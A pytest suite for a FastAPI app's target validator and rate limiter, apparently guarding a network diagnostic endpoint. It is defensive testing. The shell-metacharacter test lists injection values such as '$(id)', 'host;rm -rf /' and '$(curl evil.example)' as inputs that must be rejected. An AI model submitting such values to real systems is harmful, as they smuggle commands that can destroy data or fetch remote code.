"""
Tests for the security helpers: target validation and rate limiting.
"""

import pytest
from fastapi import HTTPException

from app.security import (
    RateLimiter,
    TargetValidationError,
    diagnostic_limiter,
    validate_target,
)


class TestValidateTarget:
    """Tests for validate_target()."""

    @pytest.mark.parametrize(
        "target",
        [
            "8.8.8.8",
            "127.0.0.1",
            "192.168.1.1",
            "2001:db8::1",
            "::1",
            "example.com",
            "sub.domain.example.org",
            "localhost",
            "a-host",
            "xn--bcher-kva.example",
        ],
    )
    def test_accepts_valid_targets(self, target):
        """Valid addresses and hostnames are accepted unchanged."""
        assert validate_target(target) == target

    def test_strips_surrounding_whitespace(self):
        """Leading and trailing whitespace is removed."""
        assert validate_target("  8.8.8.8  ") == "8.8.8.8"

    @pytest.mark.parametrize(
        "target",
        [
            "-oProxy",
            "-c",
            "--help",
            "-",
        ],
    )
    def test_rejects_option_like_targets(self, target):
        """A target that could be read as an option must be rejected."""
        with pytest.raises(TargetValidationError):
            validate_target(target)

    @pytest.mark.parametrize(
        "target",
        [
            "a;b",
            "a|b",
            "a&b",
            "$(id)",
            "`id`",
            "a>b",
            "a<b",
            "a\nb",
            "a b",
            "a\tb",
            "host;rm -rf /",
            "$(curl evil.example)",
        ],
    )
    def test_rejects_shell_metacharacters(self, target):
        """Anything with shell metacharacters or whitespace must be rejected."""
        with pytest.raises(TargetValidationError):
            validate_target(target)

    @pytest.mark.parametrize(
        "target",
        [
            "",
            "   ",
            "not a host",
            "bad_underscore.example",
            "-",
            "host..example",
            "example..com",
            "a" * 300,
        ],
    )
    def test_rejects_malformed_targets(self, target):
        """Malformed targets must be rejected."""
        with pytest.raises(TargetValidationError):
            validate_target(target)

    def test_rejects_none_and_non_strings(self):
        """Non-string input must be rejected rather than crashing."""
        for bad in (None, 123, [], {}):
            with pytest.raises(TargetValidationError):
                validate_target(bad)


class TestRateLimiter:
    """Tests for the sliding window rate limiter."""

    def test_allows_requests_under_the_limit(self):
        """Requests below the limit pass through."""
        limiter = RateLimiter(max_requests=3, period_seconds=60)
        for _ in range(3):
            limiter.check("client-a")
        assert True  # no exception raised

    def test_blocks_requests_over_the_limit(self):
        """The request past the limit is rejected with 429."""
        limiter = RateLimiter(max_requests=2, period_seconds=60)
        limiter.check("client-a")
        limiter.check("client-a")
        with pytest.raises(HTTPException) as exc:
            limiter.check("client-a")
        assert exc.value.status_code == 429
        assert exc.value.headers.get("Retry-After")

    def test_limits_are_per_key(self):
        """One noisy client must not exhaust another's budget."""
        limiter = RateLimiter(max_requests=1, period_seconds=60)
        limiter.check("client-a")
        with pytest.raises(HTTPException):
            limiter.check("client-a")
        # A different client is unaffected.
        limiter.check("client-b")

    def test_reset_clears_a_key(self):
        """Resetting a key clears its recorded hits."""
        limiter = RateLimiter(max_requests=1, period_seconds=60)
        limiter.check("client-a")
        with pytest.raises(HTTPException):
            limiter.check("client-a")
        limiter.reset("client-a")
        limiter.check("client-a")

    def test_expired_window_allows_requests_again(self):
        """Once the window passes, requests are allowed again."""
        limiter = RateLimiter(max_requests=1, period_seconds=0.01)
        limiter.check("client-a")
        with pytest.raises(HTTPException):
            limiter.check("client-a")
        import time
        time.sleep(0.02)
        limiter.check("client-a")


class TestDiagnosticLimiter:
    """The shared limiter must be configured and usable."""

    def test_shared_limiter_exists(self):
        """The module level limiter is available for the endpoints."""
        assert diagnostic_limiter is not None
        assert diagnostic_limiter.max_requests > 0
        assert diagnostic_limiter.period_seconds > 0
